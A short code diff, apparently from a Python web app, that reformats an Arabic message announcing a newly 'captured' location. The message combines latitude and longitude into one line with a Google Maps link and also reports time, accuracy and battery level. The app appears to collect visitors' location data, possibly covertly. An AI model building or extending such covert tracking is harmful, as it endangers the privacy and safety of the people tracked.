@@ -26,8 +26,9 @@ def result():
     # إعداد الرسالة
     location_data = f"""📍 موقع جديد تم التقاطه:
 
-🔸 خط العرض: {data.get('lat')}
-🔹 خط الطول: {data.get('lon')}
+🔸 الإحداثيات: {data.get('lat')}, {data.get('lon')}
+🌐 رابط مباشر: https://www.google.com/maps?q={data.get('lat')},{data.get('lon')}
+
 🕒 الوقت: {data.get('timestamp')}
 📶 الدقة: {data.get('accuracy')} متر
 🔋 البطارية: {data.get('battery')}%
